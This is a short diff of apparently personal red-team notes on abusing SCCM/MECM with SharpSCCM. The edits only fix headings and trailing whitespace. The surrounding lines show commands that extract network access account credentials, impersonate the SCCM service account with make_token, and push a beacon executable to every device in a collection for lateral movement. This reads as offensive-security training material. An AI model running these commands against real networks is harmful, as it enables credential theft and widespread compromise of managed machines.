@@ -4,7 +4,7 @@ new name for SCCM, helps push appliation and software deployments, updates and c
 
 we can use to abuse and push our own scripts, applications, or config changes
 
-**Enumeration**
+## Enumeration
 
 Tools:
 [SharpSCCM](https://github.com/Mayyhem/SharpSCCM)
@@ -60,7 +60,7 @@ execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe local naa -m wmi -
 make_token <sccm svc account> <pass>
 ```
 
-### Laterl Movement
+## Lateral Movement
 
 To execute a command on every device in the DEV collection, we could do exec -n DEV -p <path>
 ```
@@ -68,21 +68,3 @@ execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe exec -n <collectio
 executing a beacon on all sccm machines:
 execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe exec -n DEV -p "C:\Windows\System32\cmd.exe /c start /b \\dc-2\software\dns_x64.exe" -s --no-banner
 ```
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
